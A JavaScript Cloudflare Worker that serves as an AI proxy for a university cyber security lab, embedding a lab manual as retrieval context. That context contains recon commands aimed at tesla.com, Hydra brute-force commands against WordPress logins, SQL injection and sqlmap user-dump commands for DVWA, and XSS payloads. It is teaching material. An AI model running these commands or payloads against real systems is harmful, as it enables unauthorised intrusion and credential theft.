/**
 * S7 Lab — Cloudflare Worker AI Proxy with Built-In Lab RAG & Session Memory
 * Keeps all lab context and retrieval on the server side so the terminal client stays tiny.
 */

const CORS_HEADERS = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
  "Access-Control-Allow-Headers": "Content-Type, Authorization, X-Proxy-Secret, X-API-Key, X-Provider, X-Session-Id",
};

const FREE_TIER_GEMINI_MODELS = [
  "gemini-3.5-flash-lite",
  "gemini-3.1-flash-lite",
  "gemini-2.5-flash",
  "gemma-4-26b-a4b-it",
];

const SESSION_MEMORY = new Map();

const LAB_INDEX = `S7 Cyber Security Lab Syllabus (8 Experiments):
Exp 1: Familiarization of Application Penetration Testing (Theory: Passive vs Active Recon, Ethics)
Exp 2 (Practical 1): Reconnaissance & Info Gathering Using Recon-ng (tesla.com)
Exp 3 (Practical 2): Network Footprinting & Enumeration (Maltego, Nmap, Gobuster, FFUF)
Exp 4 (Practical 3): OSINT-Based Enumeration of Web Infrastructure (DNSRecon, theHarvester, Dig, Google Dorks)
Exp 5 (Practical 4): Web App Testing using WPScan, OWASP ZAP, NVD & Hydra
Exp 6 (Practical 5): Auth, Authorization & Identity Flaws in OWASP Juice Shop (Burp Intruder)
Exp 7 (Practical 6): SQL Injection & Blind SQL Injection in DVWA (Manual & SQLMap)
Exp 8 (Practical 7): Client-Side Testing in DVWA (HTML Injection, JS Execution, Reflected/Stored/DOM XSS)`;

const LAB_RAG_DOCS = [
  {
    id: 1,
    patterns: [/\bexp(eriment)?\s*1\b/i, /\bfamiliarization\b/i, /\bpassive\b/i, /\bactive recon/i, /\bethic/i],
    keywords: ["passive", "active", "reconnaissance", "ethics", "authorization", "scope", "shodan", "nikto", "dirbuster"],
    content: `Experiment 1: Familiarization of Application Penetration Testing
- Passive Recon (no direct interaction): theHarvester, Maltego, Recon-ng, Shodan, WHOIS.
- Active Recon (direct probing): Nmap, Burp Suite, OWASP ZAP, Nikto, DirBuster, Gobuster, FFUF.
- Ethics: Written authorization, strict scope, avoid DoS/data loss, responsible disclosure.`,
  },
  {
    id: 2,
    patterns: [/\bexp(eriment)?\s*2\b/i, /\bpract(ical)?\s*1\b/i, /\brecon-?ng\b/i, /\bhackertarget\b/i, /\bwhois_pocs\b/i, /\bbrute_hosts\b/i, /\bbing_domain_web\b/i],
    keywords: ["recon-ng", "workspaces", "testspace", "marketplace", "hackertarget", "whois_pocs", "brute_hosts", "bing_domain_web", "tesla.com"],
    content: `Experiment 2 (Practical 1): Reconnaissance Using Recon-ng (Target: tesla.com)
Commands:
  sudo apt update && sudo apt install -y recon-ng && recon-ng
  workspaces create testspace
  workspaces select testspace
  marketplace install recon/domains-hosts/hackertarget
  marketplace install recon/domains-contacts/whois_pocs
  marketplace install recon/domains-hosts/brute_hosts
  marketplace install recon/domains-hosts/bing_domain_web
  modules load recon/domains-hosts/hackertarget
  options set SOURCE tesla.com
  run
  modules load recon/domains-contacts/whois_pocs
  options set SOURCE tesla.com
  run
  modules load recon/domains-hosts/brute_hosts
  options set SOURCE tesla.com
  run
  modules load recon/domains-hosts/bing_domain_web
  options set SOURCE tesla.com
  run
  show hosts
  show contacts`,
  },
  {
    id: 3,
    patterns: [/\bexp(eriment)?\s*3\b/i, /\bpract(ical)?\s*2\b/i, /\bmaltego\b/i, /\bnmap\b/i, /\bgobuster\b/i, /\bffuf\b/i, /\bfootprinting\b/i],
    keywords: ["maltego", "nmap", "gobuster", "ffuf", "common.txt", "vulnweb", "footprint", "ports", "dirb"],
    content: `Experiment 3 (Practical 2): Network Footprinting (Maltego, Nmap, Gobuster, FFUF)
1. Maltego: Machines > Run Machine > Footprint L1 -> testphp.vulnweb.com
2. Nmap Flags: -sn (ping sweep), -sV (version), -p- (all 65535 ports), -A (aggressive: OS+version+scripts+traceroute), -Pn (skip ping), -T4 (fast), -O (OS detection), -F (top 100 ports).
   sudo nmap -sn <Target-IP>/24
   sudo nmap -sV -O -p- -A -T4 <TARGET-IP>
   sudo nmap -sV -p 80,443 -A -T4 testphp.vulnweb.com
   sudo nmap -F testphp.vulnweb.com
3. Gobuster: gobuster dir -u http://<lab-machine-ip> -w /usr/share/wordlists/dirb/common.txt
4. FFUF: ffuf -u http://testphp.vulnweb.com/FUZZ -w /usr/share/wordlists/dirb/common.txt`,
  },
  {
    id: 4,
    patterns: [/\bexp(eriment)?\s*4\b/i, /\bpract(ical)?\s*3\b/i, /\bdnsrecon\b/i, /\btheharvester\b/i, /\bdig\b/i, /\bdork/i],
    keywords: ["dnsrecon", "theharvester", "dig", "dork", "inurl", "intitle", "filetype", "mx", "ns", "soa", "seclists"],
    content: `Experiment 4 (Practical 3): OSINT Web Infrastructure (DNSRecon, theHarvester, Dig, Google Dorks)
1. DNSRecon:
   dnsrecon -d tesla.com
   dnsrecon -d tesla.com -t std --xml tesla_dns.xml
   dnsrecon -d tesla.com -t brt -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
2. theHarvester: theHarvester -d tesla.com -b bing
3. Dig: dig tesla.com | dig +short NS tesla.com | dig +short MX tesla.com
4. Google Dorks: inurl:admin site:tesla.com | intitle:"login" site:tesla.com | inurl:login site:testphp.vulnweb.com | filetype:php inurl:admin | site:github.com inurl:login`,
  },
  {
    id: 5,
    patterns: [/\bexp(eriment)?\s*5\b/i, /\bpract(ical)?\s*4\b/i, /\bwpscan\b/i, /\bzap(roxy)?\b/i, /\bhydra\b/i, /\bnvd\b/i, /\bwordpress\b/i],
    keywords: ["wpscan", "zap", "zaproxy", "hydra", "nvd", "cve", "cwe", "wordpress", "wp-login", "fsocity", "rockyou", "elliot"],
    content: `Experiment 5 (Practical 4): Web App Testing (WPScan, OWASP ZAP, NVD, Hydra)
- NVD (https://nvd.nist.gov/), CVE (unique vuln ID), CWE (flaw category: CWE-79 XSS, CWE-89 SQLi).
1. WPScan (u=users, vp=vuln plugins, vt=vuln themes):
   wpscan --url http://<target-ip> --enumerate u,vp,vt
2. OWASP ZAP: proxy 127.0.0.1:8080, Traditional Spider + AJAX Spider, Passive + Active Scan.
3. Hydra WordPress Brute-Force:
   sort fsocity.dic | uniq > fsocity.dic.uniq
   hydra -L /usr/share/wordlists/rockyou.txt -p blah <target-ip> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'
   hydra -l elliot -P /usr/share/wordlists/rockyou.txt <target-ip> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid password'`,
  },
  {
    id: 6,
    patterns: [/\bexp(eriment)?\s*6\b/i, /\bpract(ical)?\s*5\b/i, /\bjuice\s*shop\b/i, /\bcluster\s*bomb\b/i, /\bintruder\b/i, /\bsamuel\b/i, /\bjim\b/i, /\ballow_hijacking_localhost\b/i],
    keywords: ["juice", "juice-shop", "burp", "intruder", "cluster", "samuel", "jim", "localhost", "about:config", "lockout", "42000"],
    content: `Experiment 6 (Practical 5): Auth, Authorization & Identity Flaws in OWASP Juice Shop (:42000)
- Firefox Localhost Proxy Fix for Burp Suite (127.0.0.1:8080): about:config -> network.proxy.allow_hijacking_localhost = true.
- Burp Intruder Cluster Bomb on login: mark username=§USERNAME§&password=§PASSWORD§, uncheck '.' in Payload Encoding.
  Usernames: admin@juice-sh.op, administrator@juice-sh.op, root@juice-sh.op, user@juice-sh.op, test@juice-sh.op, guest@juice-sh.op, manager@juice-sh.op, support@juice-sh.op, security@juice-sh.op
  Passwords: admin, password, 123456, juice, welcome, admin123 -> finds admin@juice-sh.op : admin123 (HTTP 200).
- Jim's Password Reset (Star Trek OSINT: eldest brother's middle name): Email: jim@juice-sh.op | Security Answer: Samuel.`,
  },
  {
    id: 7,
    patterns: [/\bexp(eriment)?\s*7\b/i, /\bpract(ical)?\s*6\b/i, /\bsqli?\b/i, /\bsql\s*injection\b/i, /\bsqlmap\b/i, /\bblind\b/i],
    keywords: ["sqli", "sql", "sqlmap", "blind", "union", "information_schema", "dvwa", "phpsessid", "version()", "substring"],
    content: `Experiment 7 (Practical 6): SQL Injection & Blind SQLi in DVWA (Login: admin / password, Security: Low)
Part A — Classic SQLi Payloads:
  Step 5 (Error): 1'
  Step 6 (Auth Bypass): 1' AND 1=2 #  |  1' OR '1'='1
  Step 7 (DB Version): 1' UNION SELECT null, version() #
  Step 8 (Tables): 1' UNION SELECT null, table_name FROM information_schema.tables #
  Step 8 (Columns): 1' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users' #
  Dump Users: 1' UNION SELECT user, password FROM users #
Part B — Blind SQLi Payloads:
  Step 11 (Boolean): 1' AND 1=1 # (True)  |  1' AND 1=2 # (False)
  Step 12 (Substring): 1' AND SUBSTRING(database(),1,1)='d' #
  Step 13.1 (SQLMap DBs): sqlmap --url="http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=YOUR_COOKIE; security=low" --dbs --batch
  Step 13.2 (SQLMap Tables): sqlmap --url="http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=YOUR_COOKIE; security=low" -p id -D dvwa --tables --batch --threads 5
  Step 14 (SQLMap Dump Users): sqlmap --url="http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=YOUR_COOKIE; security=low" -D dvwa -T users --dump --batch --threads 5`,
  },
  {
    id: 8,
    patterns: [/\bexp(eriment)?\s*8\b/i, /\bpract(ical)?\s*7\b/i, /\bxss\b/i, /\bclient-?side\b/i, /\bhtml\s*injection\b/i, /\bdocument\.cookie\b/i],
    keywords: ["xss", "stored", "reflected", "dom", "html", "cookie", "onmouseover", "onerror", "iframe", "guestbook"],
    content: `Experiment 8 (Practical 7): Client-Side Testing (HTML Injection & XSS in DVWA Low)
- Step 2 (HTML Injection in XSS Stored): <h1>Website Defaced by Student</h1>
- Step 3 (JS Execution & Cookie Theft in XSS Stored): <script>alert('JavaScript Executed!')</script>  |  <script>alert('Cookies: ' + document.cookie)</script>
- Step 4 (Reflected XSS): <button onclick="alert('1')">Click Me!</button>
- Step 5 (DOM XSS URL): http://localhost/dvwa/vulnerabilities/xss_d/?default=<script>alert('DOM XSS')</script>
- Step 6 (Stored XSS Event Handler & Bypass Payloads): <div onmouseover=alert(1)>Hover</div> | <img src=x onmouseover=alert('XSS')> | <img src=invalidImage onerror=alert('XSS')> | <input autofocus onfocus=alert('XSS')> | <body onload=alert('XSS')> | <a href="javascript:alert('XSS')">Click Me</a> | <iframe src="javascript:alert('Iframe XSS')"></iframe>`,
  },
];

function retrieveLabRAG(query, history = [], activeExp = "") {
  const combined = `${activeExp ? `exp ${activeExp} ` : ""}${query} ${
    history.slice(-2).map((h) => h.content || "").join(" ")
  }`.toLowerCase();

  const scored = LAB_RAG_DOCS.map((doc) => {
    let score = 0;
    if (activeExp && String(doc.id) === String(activeExp)) score += 100;
    for (const pat of doc.patterns) {
      if (pat.test(combined)) score += 30;
    }
    for (const kw of doc.keywords) {
      if (combined.includes(kw)) score += 10;
    }
    return { doc, score };
  })
    .filter((x) => x.score > 0)
    .sort((a, b) => b.score - a.score);

  if (scored.length === 0) {
    return `${LAB_INDEX}`;
  }

  const topDocs = scored.slice(0, 2).map((x) => x.doc.content);
  return `${LAB_INDEX}\n\nRetrieved Lab Manual Context (RAG):\n${topDocs.join("\n\n---\n\n")}`;
}

async function fetchWebContext(query) {
  const results = [];
  const sources = [];
  try {
    const ddgUrl = `https://api.duckduckgo.com/?q=${encodeURIComponent(query)}&format=json&no_html=1&skip_disambig=1`;
    const ddgResp = await fetch(ddgUrl, { headers: { "User-Agent": "S7-Lab-Proxy/1.0" } });
    if (ddgResp.ok) {
      const ddg = await ddgResp.json();
      if (ddg.AbstractText) {
        results.push(`Summary: ${ddg.AbstractText}`);
        if (ddg.AbstractURL) sources.push(ddg.AbstractURL);
      }
      if (Array.isArray(ddg.RelatedTopics)) {
        for (const t of ddg.RelatedTopics.slice(0, 3)) {
          if (t.Text) results.push(`- ${t.Text}`);
          if (t.FirstURL) sources.push(t.FirstURL);
        }
      }
    }
  } catch (_) {}

  return {
    contextText: results.length > 0 ? `Live Web Results:\n${results.join("\n")}` : "",
    sources: [...new Set(sources)].slice(0, 4),
  };
}

async function callGemini({ apiKey, model, prompt, system, history }) {
  const candidateModels = model
    ? [model, ...FREE_TIER_GEMINI_MODELS.filter((m) => m !== model)]
    : FREE_TIER_GEMINI_MODELS;

  const contents = [];
  if (Array.isArray(history)) {
    for (const h of history) {
      if (!h || !h.content) continue;
      contents.push({
        role: h.role === "assistant" ? "model" : "user",
        parts: [{ text: String(h.content) }],
      });
    }
  }
  contents.push({ role: "user", parts: [{ text: prompt }] });

  const lastErrors = [];
  for (const modelName of candidateModels) {
    const url = `https://generativelanguage.googleapis.com/v1beta/models/${modelName}:generateContent?key=${apiKey}`;
    const isGemma = modelName.startsWith("gemma-");
    const body = isGemma
      ? {
          contents: [
            ...(system ? [{ role: "user", parts: [{ text: `System Instruction:\n${system}` }] }] : []),
            ...contents,
          ],
        }
      : {
          contents,
          systemInstruction: system ? { parts: [{ text: system }] } : undefined,
        };

    const resp = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body),
    });

    if (resp.ok) {
      const data = await resp.json();
      const candidate = (data.candidates && data.candidates[0]) || {};
      const parts = (candidate.content && candidate.content.parts) || [];
      const textParts = parts.filter((p) => !p.thought).map((p) => p.text || "");
      const reply = (textParts.length ? textParts : parts.map((p) => p.text || "")).join("\n").trim();
      return { reply, provider: `gemini (${modelName})`, sources: [] };
    }

    const errText = await resp.text();
    lastErrors.push(`${modelName} -> HTTP ${resp.status}: ${errText.slice(0, 150)}`);
  }

  throw new Error(lastErrors.join(" | "));
}

async function callOpenAICompatible({ endpoint, apiKey, model, prompt, system, history, providerLabel }) {
  const messages = [];
  if (system) messages.push({ role: "system", content: system });
  if (Array.isArray(history)) {
    for (const h of history) {
      if (h && h.content) {
        messages.push({ role: h.role === "assistant" ? "assistant" : "user", content: String(h.content) });
      }
    }
  }
  messages.push({ role: "user", content: prompt });

  const resp = await fetch(endpoint, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      Authorization: `Bearer ${apiKey}`,
    },
    body: JSON.stringify({ model, messages, temperature: 0.3 }),
  });

  if (!resp.ok) {
    const errText = await resp.text();
    throw new Error(`${providerLabel} HTTP ${resp.status}: ${errText}`);
  }

  const data = await resp.json();
  const reply = data.choices?.[0]?.message?.content || "";
  return { reply, provider: `${providerLabel} (${model})`, sources: [] };
}

async function handleAIRequest(reqBody, env, headers, sessionId = "default") {
  const prompt = (reqBody.prompt || reqBody.q || "").trim();
  if (!prompt) {
    return { error: "Missing 'prompt' in request body.", status: 400 };
  }

  if (prompt.toLowerCase() === "clear" || prompt.toLowerCase() === "/clear") {
    SESSION_MEMORY.delete(sessionId);
    return { data: { reply: "Conversation history cleared.", provider: "rag-session", sources: [] }, status: 200 };
  }

  const storedHistory = SESSION_MEMORY.get(sessionId) || [];
  const history = Array.isArray(reqBody.history) && reqBody.history.length > 0 ? reqBody.history : storedHistory;
  const activeExp = reqBody.exp || headers.get("x-exp") || "";

  const ragContext = retrieveLabRAG(prompt, history, activeExp);
  let system = `You are a concise, terminal-friendly Cyber Security Lab Assistant for Ubuntu Linux & Kali. Give brief, copy-paste ready terminal commands and payloads without fluff.\n\n${ragContext}`;

  let webSources = [];
  if (reqBody.search !== false) {
    const webData = await fetchWebContext(prompt);
    if (webData.contextText) {
      system += `\n\n${webData.contextText}`;
      webSources = webData.sources;
    }
  }

  const requestedProvider = (reqBody.provider || headers.get("x-provider") || "auto").toLowerCase();
  const passKey = headers.get("x-api-key") || reqBody.api_key || "";

  const geminiKey =
    (requestedProvider === "gemini" && passKey) ||
    env.GEMINI_API_KEY ||
    (passKey.startsWith("AIza") || passKey.startsWith("AQ.") ? passKey : "");
  const groqKey = (requestedProvider === "groq" && passKey) || env.GROQ_API_KEY || (passKey.startsWith("gsk_") ? passKey : "");
  const openaiKey =
    (requestedProvider === "openai" && passKey) ||
    env.OPENAI_API_KEY ||
    (passKey.startsWith("sk-") && !passKey.startsWith("sk-or-") ? passKey : "");
  const openrouterKey =
    (requestedProvider === "openrouter" && passKey) ||
    env.OPENROUTER_API_KEY ||
    (passKey.startsWith("sk-or-") ? passKey : "");

  const attempts = [];

  if ((requestedProvider === "auto" || requestedProvider === "gemini") && geminiKey) {
    attempts.push(() =>
      callGemini({
        apiKey: geminiKey,
        model: reqBody.model || env.GEMINI_MODEL || "gemini-3.5-flash-lite",
        prompt,
        system,
        history,
      })
    );
  }
  if ((requestedProvider === "auto" || requestedProvider === "groq") && groqKey) {
    attempts.push(() =>
      callOpenAICompatible({
        endpoint: "https://api.groq.com/openai/v1/chat/completions",
        apiKey: groqKey,
        model: reqBody.model || env.GROQ_MODEL || "llama-3.3-70b-versatile",
        prompt,
        system,
        history,
        providerLabel: "groq",
      })
    );
  }
  if ((requestedProvider === "auto" || requestedProvider === "openai") && openaiKey) {
    attempts.push(() =>
      callOpenAICompatible({
        endpoint: "https://api.openai.com/v1/chat/completions",
        apiKey: openaiKey,
        model: reqBody.model || env.OPENAI_MODEL || "gpt-4o-mini",
        prompt,
        system,
        history,
        providerLabel: "openai",
      })
    );
  }
  if ((requestedProvider === "auto" || requestedProvider === "openrouter") && openrouterKey) {
    attempts.push(() =>
      callOpenAICompatible({
        endpoint: "https://openrouter.ai/api/v1/chat/completions",
        apiKey: openrouterKey,
        model: reqBody.model || env.OPENROUTER_MODEL || "google/gemini-2.5-flash",
        prompt,
        system,
        history,
        providerLabel: "openrouter",
      })
    );
  }
  if ((requestedProvider === "auto" || requestedProvider === "cf-ai") && env.AI) {
    attempts.push(async () => {
      const cfModel = reqBody.model || "@cf/meta/llama-3.1-8b-instruct";
      const messages = [{ role: "system", content: system }];
      for (const h of history) {
        if (h && h.content) messages.push({ role: h.role === "assistant" ? "assistant" : "user", content: String(h.content) });
      }
      messages.push({ role: "user", content: prompt });
      const res = await env.AI.run(cfModel, { messages });
      return { reply: res.response || JSON.stringify(res), provider: `cloudflare-workers-ai (${cfModel})`, sources: [] };
    });
  }

  if (attempts.length === 0) {
    return {
      error: "No API key configured on Cloudflare Worker. Set GEMINI_API_KEY secret.",
      status: 500,
    };
  }

  const errors = [];
  for (const fn of attempts) {
    try {
      const res = await fn();
      res.sources = [...new Set([...(res.sources || []), ...webSources])].slice(0, 5);
      const updated = [
        ...history,
        { role: "user", content: prompt },
        { role: "assistant", content: res.reply },
      ].slice(-12);
      SESSION_MEMORY.set(sessionId, updated);
      return { data: res, status: 200 };
    } catch (e) {
      errors.push(e.message || String(e));
    }
  }

  return { error: `All upstream AI providers failed: ${errors.join(" | ")}`, status: 502 };
}

export default {
  async fetch(request, env) {
    if (request.method === "OPTIONS") {
      return new Response(null, { status: 204, headers: CORS_HEADERS });
    }

    const url = new URL(request.url);
    const pathName = url.pathname;
    const sessionId =
      request.headers.get("x-session-id") ||
      url.searchParams.get("session") ||
      request.headers.get("cf-connecting-ip") ||
      "default";

    if (env.PROXY_SECRET) {
      const clientSecret = request.headers.get("x-proxy-secret") || url.searchParams.get("secret") || "";
      if (clientSecret !== env.PROXY_SECRET) {
        return new Response(JSON.stringify({ error: "Unauthorized" }), {
          status: 401,
          headers: { ...CORS_HEADERS, "Content-Type": "application/json" },
        });
      }
    }

    if (pathName === "/" || pathName === "/help" || pathName === "/health") {
      return new Response(
        `S7 Lab AI Proxy + Server-Side RAG (Online)\n\n  curl -s "${url.origin}/ask?q=exp+7+sqlmap+command"\n`,
        { status: 200, headers: { ...CORS_HEADERS, "Content-Type": "text/plain; charset=utf-8" } }
      );
    }

    if (pathName === "/api/chat" && request.method === "POST") {
      const body = await request.json().catch(() => ({}));
      const result = await handleAIRequest(body, env, request.headers, sessionId);
      return new Response(JSON.stringify(result.error ? { error: result.error } : result.data), {
        status: result.status || 200,
        headers: { ...CORS_HEADERS, "Content-Type": "application/json" },
      });
    }

    if (pathName === "/ask" || pathName === "/api/ask") {
      let prompt = url.searchParams.get("q") || "";
      let exp = url.searchParams.get("exp") || "";
      if (!prompt && request.method === "POST") {
        const ct = request.headers.get("content-type") || "";
        if (ct.includes("application/json")) {
          const j = await request.json().catch(() => ({}));
          prompt = j.prompt || j.q || "";
          exp = j.exp || exp;
        } else {
          prompt = await request.text();
        }
      }
      const result = await handleAIRequest({ prompt, exp, search: true }, env, request.headers, sessionId);
      return new Response(result.error ? `[ERROR] ${result.error}\n` : `${result.data.reply}\n`, {
        status: result.status || 200,
        headers: { ...CORS_HEADERS, "Content-Type": "text/plain; charset=utf-8" },
      });
    }

    return new Response("Not Found\n", { status: 404, headers: CORS_HEADERS });
  },
};
